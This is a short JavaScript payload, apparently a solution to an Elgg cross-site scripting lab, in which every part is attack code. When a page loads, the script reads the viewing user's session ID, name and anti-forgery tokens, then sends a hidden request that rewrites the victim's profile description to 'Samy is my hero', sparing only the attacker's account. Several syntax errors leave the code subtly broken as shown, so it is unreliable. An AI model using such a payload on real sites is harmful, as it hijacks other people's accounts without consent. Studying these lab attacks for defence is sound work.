<script type-"text/javascript">
window.onload function(){
	var guid= "&guid=" + elgg.session.user.guid;
	var ts= "&__elgg_ts=" + elgg.security.token.__elgg_ts;
	var token = "&__elgg_token=" + elgg.security.token.__elgg_token; 
	var name ="&name=" + elgg.session.user.name;
	var desc="&description=Samy is my hero" + "&accesslevel [description] =2";

	var sendurl="http://www.xsslabelgg.com/action/profile/edit";
	var content=token+ts+name+ desc + guid;
	attackerGuid=45;
	if (elgg.session.user.guid != attackerGuid){
		var Ajax=null;
		Ajax = new XMLHttpRequest();
		Ajax.open("POST",sendurl, true); 
		Ajax.setRequestHeader("Content-Type",
			"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
}

</script>
